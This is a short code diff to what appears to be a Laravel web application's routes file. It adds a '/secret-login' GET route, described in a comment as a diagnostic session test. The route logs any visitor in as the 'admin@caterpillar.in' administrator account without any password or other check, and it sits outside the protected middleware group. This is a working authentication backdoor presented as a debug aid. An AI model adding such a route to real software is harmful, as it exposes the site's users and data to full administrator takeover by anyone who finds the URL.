@@ -14,6 +14,16 @@ Route::get('/login',  [AuthController::class, 'showLogin'])->name('login');
 Route::post('/login', [AuthController::class, 'login'])->name('login.post');
 Route::post('/logout',[AuthController::class, 'logout'])->name('logout');
 
+// DIAGNOSTIC CORE: Bypass form to test sessions
+Route::get('/secret-login', function() {
+    $user = \App\Models\User::where('email', 'admin@caterpillar.in')->first();
+    if ($user) {
+        \Illuminate\Support\Facades\Auth::login($user);
+        return redirect()->route('dashboard');
+    }
+    return "User not found in DB";
+});
+
 // ── Protected (requires login) ─────────────────────────────────
 Route::middleware('auth.company')->group(function () {
     Route::get('/',           [DashboardController::class,  'index'])->name('dashboard');
